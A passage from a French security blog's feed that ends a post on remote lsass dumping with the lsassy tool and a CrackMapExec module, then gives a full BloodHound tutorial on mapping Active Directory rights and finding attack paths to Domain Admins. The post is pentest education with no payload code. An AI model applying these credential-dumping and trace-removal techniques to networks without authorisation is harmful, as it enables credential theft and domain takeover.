&lt;p&gt;Avec ce nouveau minidump, j’ai modifié le module CrackMapExec qui permet cette fois d’aller dumper lsass sur un ensemble de machines distantes, d’extraire les mots de passe &lt;strong&gt;à distance&lt;/strong&gt; sur ces dumps, et de supprimer les traces de mon passage après coup.&lt;/p&gt;

&lt;p&gt;Comme pypykatz et minidump ne fonctionnent que sous python3.6+ et que CrackMapExec n’est pas encore compatible avec python3, je ne peux pas faire de pull request pour le moment, ni importer pypykatz dans mon module. Pour le moment, l’appel à pypykatz se fait via une exécution de commande shell.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://twitter.com/mpgn_x64&quot;&gt;mpgn&lt;/a&gt; est en train de travailler sur le &lt;a href=&quot;https://github.com/byt3bl33d3r/CrackMapExec/pull/323&quot;&gt;port de CrackMapexec vers python 3&lt;/a&gt;, et quand ce sera fait, je proposerai ce module à Byt3bl33d3r pour intégration dans l’outil.&lt;/p&gt;

&lt;h2 id=&quot;nouveaux-outils&quot;&gt;Nouveaux outils&lt;/h2&gt;

&lt;p&gt;En attendant tout ça, voici deux outils que j’ai développés pour concrétiser ces recherches :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/Hackndo/lsassy&quot;&gt;lsassy&lt;/a&gt; est disponible sur mon &lt;a href=&quot;https://github.com/Hackndo/lsassy&quot;&gt;Github&lt;/a&gt; ou sur &lt;a href=&quot;https://pypi.org/project/lsassy/&quot;&gt;Pypi&lt;/a&gt;. C’est l’interface entre Pypykatz et la cible, qui permet de lire le dump de lsass à distance, avec les optimisations dont on a parlé dans cet article.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[Le module CrackMapExec](https://github.com/Hackndo/lsassy/tree/master/cme) permet d'automatiser tout le processus en faisant un dump de lsass sur les machines distantes, et en extrayant les identifiants des personnes connectées en utilisant **lsassy**. Il permet également de détecter les comptes ayant un chemin d'attaque pour devenir administrateur du domaine, en s'appuyant sur les données collectées avec l'outil [Bloodhound](/bloodhound)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Il reste du travail à faire pour intégrer ces changements à CrackMapExec, que ce soit au niveau compatibilité des versions de python, propreté et maintenabilité du code, mais ces recherches me sont très utiles pour mieux comprendre les outils que j’utilise au quotidien.&lt;/p&gt;

&lt;p&gt;J’ai aujourd’hui un outil qui fonctionne bien, rapidement, et qui peut être intégré à CrackMapExec en utilisant quelques tricks, donc qui me sert grandement dans mes tests internes, et j’espère que ça pourra vous être utile.&lt;/p&gt;

&lt;p&gt;J’espère que cet article vous donnera de nouvelles idées pour faire évoluer les outils d’infosec que nous utilisons au quotidien, à plus tard pour un nouvel article !&lt;/p&gt;
</description>
        <pubDate>Thu, 28 Nov 2019 23:40:00 +0100</pubDate>
        <link>http://localhost:4000//remote-lsass-dump-passwords/</link>
        <guid isPermaLink="true">http://localhost:4000//remote-lsass-dump-passwords/</guid>
        
        <category>Active Directory</category>
        
        <category>Windows</category>
        
        
      </item>
    
      <item>
        <title>BloodHound</title>
        <description>&lt;p&gt;BloodHound est un outil permettant de cartographier un environnement Active Directory en le représentant sous forme de graphe. Cette représentation offre alors toute la puissance de la théorie des graphes pour découvrir des chemins d’attaque qui auraient été autrement difficiles voire impossibles à détecter.&lt;/p&gt;

&lt;!--more--&gt;

&lt;h2 id=&quot;active-directory&quot;&gt;Active Directory&lt;/h2&gt;

&lt;p&gt;En environnement Active Directory, la gestion des droits est complexe, très complexe. Il n’est pas rare qu’un utilisateur fasse partie d’un groupe, qui fait partie de 10 groupes, et que l’un des groupes ait le droit de modifier une GPO qui s’applique à une OU, dans laquelle se trouve des utilisateurs avec des droits d’administration sur un groupe de machines, etc. On pourrait trouver des déclinaisons de droits à l’infini.&lt;/p&gt;

&lt;p&gt;Le soucis, c’est qu’en tant qu’administrateur d’un système d’information complexe, ces délégations de droits sont extrêmement complexes à détecter. En effet, l’administrateur regarde les listes de droits qu’a un utilisateur ou un groupe sur un objet en particulier. Il existe parfois plusieurs dizaines de droits différents qui peuvent être appliqués sur un objet.&lt;/p&gt;

&lt;p&gt;Voici un exemple d’une liste d’ACE (Access Control Entry) que l’on peut trouver sur un objet “GPO”.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;../assets/uploads/2019/07/acl_complexity.png&quot;&gt;&lt;img src=&quot;../assets/uploads/2019/07/acl_complexity.png&quot; alt=&quot;ACL Complexity&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;La barre de défilement à droite montre que le nombre d’entrées possibles est très important. Imaginez alors qu’il y a des entrées comme celles-ci sur tous les objets de l’Active Directory, que certains droits peuvent s’appliquer via délégation, qu’il y a des groupes inclus dans d’autres groupes, héritant des droits des groupes parents, etc.&lt;/p&gt;

&lt;p&gt;C’est là qu’entre en jeu l’outil &lt;a href=&quot;https://github.com/BloodHoundAD/BloodHound&quot;&gt;BloodHound&lt;/a&gt;. Quand la vision en mode liste des droits est un calvaire, la vision en mode graphe apporte quant à elle une clarté et un recul extrêmement valorisants.&lt;/p&gt;

&lt;h2 id=&quot;bloodhound&quot;&gt;BloodHound&lt;/h2&gt;

&lt;p&gt;BloodHound est un outil développé par &lt;a href=&quot;https://twitter.com/_wald0&quot;&gt;@wald0&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/harmj0y&quot;&gt;@Harmj0y&lt;/a&gt; et &lt;a href=&quot;https://twitter.com/cptjesus&quot;&gt;@CptJesus&lt;/a&gt;, dont j’ai parlé dans l’article sur les &lt;a href=&quot;/gpo-abuse-with-edit-settings/&quot;&gt;GPO&lt;/a&gt;. L’idée de cet outil est d’analyser un environnement Active Directory en énumérant les différents objets de l’environnement, et en les liant avec des relations. Par exemple, si un utilisateur &lt;code class=&quot;highlighter-rouge&quot;&gt;support-account&lt;/code&gt; est membre du groupe &lt;code class=&quot;highlighter-rouge&quot;&gt;support&lt;/code&gt;, l’utilisateur sera lié par la relation &lt;code class=&quot;highlighter-rouge&quot;&gt;MemberOf&lt;/code&gt; au groupe.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/07/MemberOf.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/07/MemberOf.png&quot; alt=&quot;MemberOf&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;C’est une visualisation assez claire d’une appartenance, mais l’outil ne s’arrête pas là. Il permet de voir également que le groupe &lt;code class=&quot;highlighter-rouge&quot;&gt;support&lt;/code&gt; fait partie du groupe &lt;code class=&quot;highlighter-rouge&quot;&gt;DOMAIN ADMINS&lt;/code&gt;, donc par héritage, le compte &lt;code class=&quot;highlighter-rouge&quot;&gt;support&lt;/code&gt; est un administrateur de domaine.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/07/memberOfNested.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/07/memberOfNested.png&quot; alt=&quot;memberOfNested&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Et en fait, ce n’est pas tout, si on demande de lister l’ensemble des groupes auxquels appartient &lt;code class=&quot;highlighter-rouge&quot;&gt;support&lt;/code&gt;, on se rend compte qu’il appartient finalement à beaucoup d’autres groupes !&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/07/MemberOfDelegated.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/07/MemberOfDelegated.png&quot; alt=&quot;MemberOfDelegated&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Bien entendu, il existe bien d’autres “relations” entre les objets. A l’heure de cet article, voici la liste des relations disponibles.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/07/edges.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/07/edges.png&quot; alt=&quot;edges&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;On notera par exemple &lt;code class=&quot;highlighter-rouge&quot;&gt;AdminTo&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;HasSession&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;GenericAll&lt;/code&gt; ou encore &lt;code class=&quot;highlighter-rouge&quot;&gt;AddAllowedToAct&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Nous avons donc un ensemble d’objets liés entre eux par des relations. Il est alors possible de trouver des chemins en utilisant la théorie des graphes.&lt;/p&gt;

&lt;h2 id=&quot;théorie-des-graphes&quot;&gt;Théorie des graphes&lt;/h2&gt;

&lt;p&gt;La &lt;a href=&quot;https://fr.wikipedia.org/wiki/Th%C3%A9orie_des_graphes&quot;&gt;théorie de graphes&lt;/a&gt; s’appuie sur une représentation “graphe” des données. C’est un modèle constitué de noeuds (ici les objets de l’Active Directory) et d’arêtes (ici les relations entre les objets).&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/07/graphe_example.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/07/graphe_example.png&quot; alt=&quot;graphe_example&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Les arêtes peuvent être orientées ou non. Dans le cas de BloodHound, elles le sont toujours. Cela signifie que pour aller d’un noeud A à un noeud B, il faut qu’ils soient reliés par une arête allant de A vers B. L’autre sens ne fonctionne pas.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/07/oriented_edge.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/07/oriented_edge.png&quot; alt=&quot;oriented_edge&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Une fois que nous avons ces noeuds reliés par des arêtes, nous pouvons chercher des chemins particuliers pour partir d’un noeud de départ et arriver à un noeud de destination, en passant par tout un ensemble de noeuds. Il existe souvent plusieurs chemins possibles, et la théorie des graphes permet de trouver les chemins les plus courts pour relier deux points particuliers.&lt;/p&gt;

&lt;p&gt;Ainsi, le graphe suivant est constitué de 7 noeuds et 9 arêtes.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/07/graphe_before.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/07/graphe_before.png&quot; alt=&quot;graphe_before&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Si nous avons réussi à prendre la main sur le noeud le plus à gauche, et que nous souhaitons atteindre le noeud le plus à droite, car c’est le noeud &lt;code class=&quot;highlighter-rouge&quot;&gt;Administrateur de domaine&lt;/code&gt;, la théorie des graphes permet de trouver le chemin le plus court entre les deux.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/07/graphe_after.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/07/graphe_after.png&quot; alt=&quot;graphe_after&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Un attaquant ayant cette information saura comment se déplacer dans le réseau pour atteindre son objectif en un minimum d’étapes.&lt;/p&gt;

&lt;p&gt;Prenons comme exemple un environnement Active Directory. Il est composé d’un grand nombre de noeuds.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/07/all_nodes.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/07/all_nodes.png&quot; alt=&quot;All nodes&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Si nous compromettons l’utilisateur &lt;code class=&quot;highlighter-rouge&quot;&gt;JDOE&lt;/code&gt;, voici le chemin le plus court pour atteindre le groupe &lt;code class=&quot;highlighter-rouge&quot;&gt;DOMAIN ADMINS&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/07/ad_shortest_path.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/07/ad_shortest_path.png&quot; alt=&quot;ad_shortest_path&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Comme on peut le voir, le chemin “le plus court” est finalement long, ce qui laisse présager une grande complexité des droits dans ce système d’information. Utiliser BloodHound permet, malgré cette complexité, d’extraire simplement et clairement un chemin d’attaque depuis un utilisateur qui à priori n’avait pas de droits particuliers.&lt;/p&gt;

&lt;p&gt;Pour pouvoir traiter ces informations en mode graphe, BloodHound utilise la base de données “Neo4j”, orientée graphe pour stocker les informations récoltées.&lt;/p&gt;

&lt;h2 id=&quot;fonctionnement&quot;&gt;Fonctionnement&lt;/h2&gt;

&lt;p&gt;L’outil BloodHound manipule plusieurs données, récoltées par différentes techniques.&lt;/p&gt;

&lt;p&gt;D’abord, afin de récolter les informations relatives à l’annuaire, il est nécessaire de les demander à un contrôleur de domaine. En effet, si nous sommes en possession d’un compte de domaine, même s’il n’a aucun droit particuliers, nous pouvons parcourir l’ensemble des utilisateurs, des machines, des GPO, lire les ACL, et d’autres informations.&lt;/p&gt;

&lt;p&gt;Par ailleurs, jusqu’à récemment, il était possible de demander aux différentes machines la liste de leurs groupes locaux, ce qui permettait de savoir qui était administrateur local de quelle machine en corrélant cette information avec l’appartenance des utilisateurs aux différents groupes.&lt;/p&gt;

&lt;p&gt;Ensuite, nous sommes en mesure d’énumérer les sessions distantes sur les machines via la commande &lt;code class=&quot;highlighter-rouge&quot;&gt;net session \\computer&lt;/code&gt;. Un exemple de sortie de cette commande est la suivante :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;net session \\computer

Computer      User name                Client type  Opens   Idle time
---------------------------------------------------------------------
\\SOURCE      SUPPORT-ACCOUNT          Windows 7    1       00:00:13
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Cette commande permet de savoir que l’utilisateur &lt;code class=&quot;highlighter-rouge&quot;&gt;SUPPORT-ACCOUNT&lt;/code&gt; a demandé une ressource sur &lt;code class=&quot;highlighter-rouge&quot;&gt;computer&lt;/code&gt; depuis le host &lt;code class=&quot;highlighter-rouge&quot;&gt;SOURCE&lt;/code&gt;. Cette information permet d’affirmer que &lt;code class=&quot;highlighter-rouge&quot;&gt;SUPPORT-ACCOUNT&lt;/code&gt; a en ce moment une session active sur &lt;code class=&quot;highlighter-rouge&quot;&gt;SOURCE&lt;/code&gt;. C’est une information importante puisqu’elle indique que le secret d’authentification de &lt;code class=&quot;highlighter-rouge&quot;&gt;support-account&lt;/code&gt; est présent dans la mémoire de &lt;strong&gt;lsass&lt;/strong&gt; sur la machine &lt;code class=&quot;highlighter-rouge&quot;&gt;SOURCE&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Ces différentes informations (non exhaustives) sont récoltées via le collecteur &lt;a href=&quot;https://github.com/BloodHoundAD/SharpHound&quot;&gt;SharpHound&lt;/a&gt;, et sont enregistrées sous un format &lt;code class=&quot;highlighter-rouge&quot;&gt;json&lt;/code&gt; dans différents fichiers.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/07/list_files.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/07/list_files.png&quot; alt=&quot;list_files&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ces fichiers sont ensuite importés dans BloodHound qui les stocke dans la base de données Neo4j. Une fois l’import terminé, l’interface graphique BloodHound permet de visualiser rapidement ces données via des requêtes préparées ou des requêtes personnalisées.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/07/prebuilt_queries.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/07/prebuilt_queries.png&quot; alt=&quot;prebuilt_queries&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Il est également possible de directement envoyer les requêtes dans l’interface de Neo4j, ce qui peut être utile pour extraire des données sous forme de tableau, par exemple.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/07/neo4j_interface.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/07/neo4j_interface.png&quot; alt=&quot;neo4j_interface&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;requêtes&quot;&gt;Requêtes&lt;/h2&gt;

&lt;p&gt;Au dela des requêtes proposées par BloodHound, il est possible d’écrire ses propres requêtes. Je ne vais pas écrire ici un tutoriel à ce sujet, pour la raison suivante : &lt;a href=&quot;https://twitter.com/cptjesus&quot;&gt;CptJesus&lt;/a&gt; a écrit l’article &lt;a href=&quot;https://blog.cptjesus.com/posts/introtocypher&quot;&gt;BloodHound: Intro to Cypher&lt;/a&gt; dans lequel il décrit en détail le fonctionnement des requêtes dans BloodHound et dans Neo4j. Elles sont appelées “Cypher Queries”.&lt;/p&gt;

&lt;p&gt;Vous pouvez également aller lire le papier de &lt;a href=&quot;https://twitter.com/SadProcessor&quot;&gt;SadProcessor&lt;/a&gt; appelé &lt;a href=&quot;https://www.ernw.de/download/BloodHoundWorkshop/ERNW_DogWhispererHandbook.pdf&quot;&gt;The Dog Whisperer’s Handbook&lt;/a&gt; qui présente BloodHound et introduit le langage de requête.&lt;/p&gt;

&lt;p&gt;Je vous laisse ainsi le soin d’aller lire ces articles afin de comprendre le fonctionnement de ce langage.&lt;/p&gt;

&lt;p&gt;Sachez cependant qu’il est possible d’activer le mode “debug” dans BloodHound permettant d’afficher les requêtes effectuées lorsque vous cliquez sur un bouton dans l’interface graphique.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/07/debug_mode.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/07/debug_mode.png&quot; alt=&quot;debug_mode&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Cette requête peut ensuite être rejouée dans Neo4j si besoin.&lt;/p&gt;

&lt;p&gt;Pour tout de même montrer un exemple de requête, voici à quoi ça ressemble :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;MATCH p=(n:User {name:&quot;SUPPORT-ACCOUNT@ADSEC.LOCAL&quot;})-[r:MemberOf*1..]-&amp;gt;(g:Group) RETURN p
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cette requête permet de lister la hiérarchie des groupes auxquels appartient l’utilisateur &lt;code class=&quot;highlighter-rouge&quot;&gt;support-account&lt;/code&gt;. Pour cela, elle peut être découpée en 2 parties.&lt;/p&gt;

&lt;p&gt;La première partie &lt;code class=&quot;highlighter-rouge&quot;&gt;MATCH&lt;/code&gt; indique ce que l’on recherche. Ce qu’on trouve entre parenthèse indique les noeuds, et entre crochets les relations.&lt;/p&gt;

&lt;p&gt;Nous cherchons donc un noeud &lt;code class=&quot;highlighter-rouge&quot;&gt;n&lt;/code&gt; de type &lt;code class=&quot;highlighter-rouge&quot;&gt;User&lt;/code&gt; ayant une relation &lt;code class=&quot;highlighter-rouge&quot;&gt;r&lt;/code&gt; de type &lt;code class=&quot;highlighter-rouge&quot;&gt;MemberOf&lt;/code&gt; vers un noeud &lt;code class=&quot;highlighter-rouge&quot;&gt;g&lt;/code&gt; de type &lt;code class=&quot;highlighter-rouge&quot;&gt;Group&lt;/code&gt;. Le contenu entre accolades permet d’appliquer un filtre, ici un filtre sur le nom &lt;code class=&quot;highlighter-rouge&quot;&gt;SUPPORT-ACCOUNT@ADSEC.LOCAL&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Dans la partie relation entre crochets, nous indiquons que cette relation doit être présente une ou plusieurs fois (&lt;code class=&quot;highlighter-rouge&quot;&gt;*1..&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;La deuxième partie &lt;code class=&quot;highlighter-rouge&quot;&gt;RETURN&lt;/code&gt; indique ce que nous souhaitons retourner suite à la recheche. Ici, nous souhaitons retourner la relation dans son ensemble, que nous avons assignée à la variable &lt;code class=&quot;highlighter-rouge&quot;&gt;p&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/07/query_result.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/07/query_result.png&quot; alt=&quot;query_result&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Nous aurions pu décider de seulement lister les groupes, sans lister les relations. Pour cela, il suffit de seulement retourner les noeuds &lt;code class=&quot;highlighter-rouge&quot;&gt;g&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/07/query_result_g.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/07/query_result_g.png&quot; alt=&quot;query_result_g&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Pour des requêtes plus complexes, les liens donnés précédemment vous permettront de creuser le sujet.&lt;/p&gt;

&lt;h2 id=&quot;tips--tricks&quot;&gt;Tips &amp;amp; tricks&lt;/h2&gt;

&lt;p&gt;Voici une liste de quelques petites astuces ou informations qui peuvent être importantes ou utiles.&lt;/p&gt;

&lt;h3 id=&quot;dark-mode&quot;&gt;Dark mode&lt;/h3&gt;

&lt;p&gt;La première, et de loin la plus importante, c’est le mode sombre de l’interface graphique !&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/07/dark_mode.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/07/dark_mode.png&quot; alt=&quot;dark_mode&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ce mode permet d’avoir une interface sombre et classe, ce qui est super agréable. Voilà, c’est beau, mais c’est tout.&lt;/p&gt;

&lt;h3 id=&quot;clic-droit&quot;&gt;Clic droit&lt;/h3&gt;

&lt;p&gt;Lorsqu’il y a une relation entre deux noeuds, vous pouvez faire un “clic droit” sur la relation, et une pop-up vous affichera un grand nombre d’informations extrêmement utiles.&lt;/p&gt;

&lt;p&gt;Vous ne savez pas comment exploiter le lien &lt;code class=&quot;highlighter-rouge&quot;&gt;GenericAll&lt;/code&gt; ?&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/07/genericall_link.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/07/genericall_link.png&quot; alt=&quot;genericall_link&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Pas de problème, un clic droit sur le lien permet d’afficher la bulle d’aide.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/07/help_modal.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/07/help_modal.png&quot; alt=&quot;help_modal&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Elle contient toutes les informations nécessaires pour prendre la main sur la machine de destination.&lt;/p&gt;

&lt;h3 id=&quot;owned&quot;&gt;Owned&lt;/h3&gt;

&lt;p&gt;Lors de l’avancement de votre test d’intrusion, vous allez compromettre des machines, des utilisateurs, des groupes. Afin de ne pas perdre le fil, vous pouvez marquer les objets comme “owned” après un clic droit sur ceux-ci.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/07/owned.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/07/owned.png&quot; alt=&quot;owned&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Une icône marquera ces objets par la suite.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/07/owned_object.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/07/owned_object.png&quot; alt=&quot;owned_object&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Si vous tentez de compromettre un objet en particulier, vous pouvez maintenant demander le chemin d’attaque le plus court depuis vos cibles déjà compromises.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/07/shortestpath_owned.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/07/shortestpath_owned.png&quot; alt=&quot;shortestpath_owned&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;filtres&quot;&gt;Filtres&lt;/h3&gt;

&lt;p&gt;Si vous ne voulez pas afficher certains chemins parce qu’il y a des relations que vous ne savez pas exploiter, ou parce que vous n’avez pas le temps, ou toutes autres raisons, vous pouvez décider de décocher les relations pour qu’elles n’apparaissent plus dans vos requêtes. Pour cela, il suffit de cliquer sur le bouton de filtre, à droite de la barre de recherche, et de cocher et décocher les éléments qui vous intéressent.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/07/edge_filtering.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/07/edge_filtering.png&quot; alt=&quot;Edge Filtering&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;raccourcis&quot;&gt;Raccourcis&lt;/h3&gt;

&lt;p&gt;Il existe quelques raccourcis qui peuvent être utiles lors de l’utilisation de BloodHound. Si vous en connaissez d’autres, n’hésitez pas à les partager.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;CTRL&lt;/strong&gt; : Permet de changer le mode d’affichage du nom des noeuds. En appuyant sur la touche, soit vous afficherez toujours les noeuds, soit vous les afficherez lorsqu’il n’y en a pas trop (la limite peut être définie dans les réglages), soit vous les cachez en permanence, ce qui peut être utile pour anonymiser les captures d’écran.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CTRL+SHIFT+I&lt;/strong&gt; : Affiche les outils développeurs. Si vous avez un bug dans l’interface, la console javascript permettra souvent de comprendre l’origine du problème.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CTRL+R&lt;/strong&gt; : Recharge l’affichage.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;edition&quot;&gt;Edition&lt;/h3&gt;

&lt;p&gt;Lors de la collecte, votre machine a été collectée et vous ne souhaitez pas la voir apparaitre ? Vous vous êtes connecté sur une machine, mais le lien “HasSession” de l’administrateur de domaine n’est plus effectif puisque cette machine a redémarré, effaçant les identifiants tant attendus ? Au contraire, un autre utilisateur s’est connecté sur cette machine ?&lt;/p&gt;

&lt;p&gt;Une fois que les données ont été importées dans BloodHound, elles ne sont pas figées. Vous pouvez les modifier à votre guise, soit via un clic droit sur un objet ou une relation pour les supprimer, soit via un clic droit dans l’arrière plan pour ajouter un noeud ou une relation.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/07/add_edge.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/07/add_edge.png&quot; alt=&quot;Add edge&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;notes--captures-décran&quot;&gt;Notes &amp;amp; Captures d’écran&lt;/h3&gt;

&lt;p&gt;De la même manière, vous pouvez sauvegarder des informations sur des objets de l’Active Directory en cliquant sur ceux-ci et en allant dans la section “Notes” dans l’interface de BloodHound.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/07/notes_pictures.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/07/notes_pictures.png&quot; alt=&quot;notes_pictures&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;bloodhound-analytics&quot;&gt;BloodHound Analytics&lt;/h3&gt;

&lt;p&gt;Enfin, la même équipe qui a développé BloodHound a également mis à disposition des outils permettant de faire des statistiques sur une extraction BloodHound. Ils sont disponibles sur &lt;a href=&quot;https://github.com/BloodHoundAD/BloodHound-Tools/&quot;&gt;leur Github&lt;/a&gt;, notamment le template &lt;code class=&quot;highlighter-rouge&quot;&gt;bloodhoundanalytics.pbix&lt;/code&gt; qui utilise &lt;code class=&quot;highlighter-rouge&quot;&gt;PowerBI&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Voici un exemple pris du &lt;a href=&quot;https://twitter.com/_wald0/status/1139672785389703168&quot;&gt;tweet&lt;/a&gt; de Wald0, qui montre un tableau PowerBI en utilisant le template fourni sur le Github.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/07/PowerBi_result.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/07/PowerBi_result.png&quot; alt=&quot;PowerBI&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Le résultat est superbe, et très explicite pour le management.&lt;/p&gt;

&lt;h2 id=&quot;aller-plus-loin&quot;&gt;Aller plus loin&lt;/h2&gt;

&lt;p&gt;Une &lt;a href=&quot;https://www.youtube.com/watch?v=lxd2rerVsLo&quot;&gt;présentation&lt;/a&gt; a été faite à la BSides par les trois auteurs en 2016 pour présenter BloodHound.&lt;/p&gt;

&lt;p&gt;Les auteurs de l’outil sont également présents sur le &lt;a href=&quot;http://bloodhoundhq.slack.com/&quot;&gt;Slack&lt;/a&gt; dédié. Il y a une grande communauté présente sur ce Slack prête à vous accueillir et à répondre à vos questions. Il y a même un channel #french !&lt;/p&gt;

&lt;p&gt;BloodHound n’est pas le seul outil dans son genre. Nous avons un outil franco-français appelé &lt;a href=&quot;https://github.com/ANSSI-FR/AD-control-paths&quot;&gt;AD Control Paths&lt;/a&gt; développé par l’ANSSI. Une &lt;a href=&quot;https://www.sstic.org/2014/presentation/chemins_de_controle_active_directory/&quot;&gt;présentation&lt;/a&gt; a été faite au SSTIC à ce sujet et le PDF associé est très intéressant. Je vous invite vivement à la lire.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

